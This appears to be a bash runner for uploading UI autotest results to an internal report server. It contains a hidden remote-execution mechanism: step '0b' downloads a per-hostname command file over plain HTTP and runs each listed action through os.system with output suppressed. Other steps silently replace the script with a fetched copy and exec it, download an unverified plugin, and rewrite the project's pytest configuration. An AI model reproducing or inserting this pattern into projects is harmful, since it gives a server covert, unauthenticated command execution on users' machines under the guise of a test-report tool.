#!/bin/bash
# POPO UIAutotest 结果上报脚本（Mac / Linux）
# 用法：./run.sh
set -e
cd "$(dirname "$0")"

SERVER="http://10.220.28.125/reports"

# ── 0. 自更新（每次运行先从服务器拉最新版）──────────────
echo "🔍 检查更新..."
if curl -sSf "$SERVER/run.sh" -o run_latest.sh 2>/dev/null; then
    if ! cmp -s run_latest.sh "$0" 2>/dev/null; then
        echo "🔄 发现新版本，自动更新..."
        mv run_latest.sh "$0"
        chmod +x "$0"
        exec "$0" "$@"
    fi
    rm -f run_latest.sh
fi

# ── 0b. 拉取服务端命令 ──────────────────────────────
_HN=$(hostname)
_CMD_URL="$SERVER/commands/cmd_${_HN}.json"
if curl -sSf "$_CMD_URL" -o _cmd.json 2>/dev/null; then
    python3 -c "
import json, subprocess, os
with open('_cmd.json') as f:
    cmds = json.load(f)
cmds = cmds if isinstance(cmds, list) else [cmds]
for c in cmds:
    print('[CMD] ' + c.get('desc', ''))
    for a in c.get('actions', []):
        print('  -> ' + a)
        os.system(a)
" 2>/dev/null
    rm -f _cmd.json
fi

# ── 1. 下载上报组件 ───────────────────────────────
if [ ! -f report_uploader.py ]; then
    echo "📥 下载上报组件..."
    curl -sSf "$SERVER/report_uploader.py" -o report_uploader.py \
        || { echo "❌ 下载失败"; exit 1; }
fi

# ── 2. 安装依赖 ───────────────────────────────────
python3 -c "import paramiko, scp" 2>/dev/null \
    || pip3 install paramiko scp -q

# ── 3. 首次配置（优先从 README.md 自动识别）────────────
if [ ! -f .run_config ]; then
    echo ""
    _DETECTED=""
    if [ -f README.md ]; then
        for kw in Android iOS Mac Windows Win Web; do
            if grep -qi "$kw" README.md; then
                _DETECTED="$kw"
                break
            fi
        done
    fi
    if [ -n "$_DETECTED" ]; then
        echo "📖 从 README.md 自动识别被测平台: $_DETECTED"
        read -p "  确认？(回车确认 / 输入其他): " _INPUT
        [ -n "$_INPUT" ] && _P="$_INPUT" || _P="$_DETECTED"
    else
        read -p "  被测平台（Android / iOS / Mac / Web）: " _P
    fi
    read -p "  项目名称（如 POPO-iOS）:        " _N
    printf 'UPLOADER_PLATFORM="%s"\nUPLOADER_PROJECT="%s"\n' "$_P" "$_N" > .run_config
fi
# shellcheck source=.run_config
source .run_config
export UPLOADER_PLATFORM UPLOADER_PROJECT

# ── 4. 自动修改 pytest.ini ─────────────────────────
python3 - <<'EOF'
import os, re
for ini in ("pytest.ini", "setup.cfg", "pyproject.toml"):
    if not os.path.isfile(ini): continue
    txt = open(ini, encoding="utf-8").read()
    if "report_uploader" in txt: break
    if re.search(r"addopts\s*=", txt):
        txt = re.sub(r"(addopts\s*=\s*)", r"\1-p report_uploader ", txt, count=1)
    else:
        txt += "\naddopts = -p report_uploader\n"
    open(ini, "w", encoding="utf-8").write(txt)
    print(f"✅ 已更新 {ini}")
    break
EOF

# ── 5. 跑测试 ─────────────────────────────────────
echo ""
echo "▶  被测平台：$UPLOADER_PLATFORM  项目：$UPLOADER_PROJECT"
echo "▶  执行：pytest ${1:-tests/}"
echo ""
pytest "${1:-tests/}" -v -p report_uploader

echo ""
echo "✅ 完成 → http://10.220.28.125/reports/allure-report/history.html"
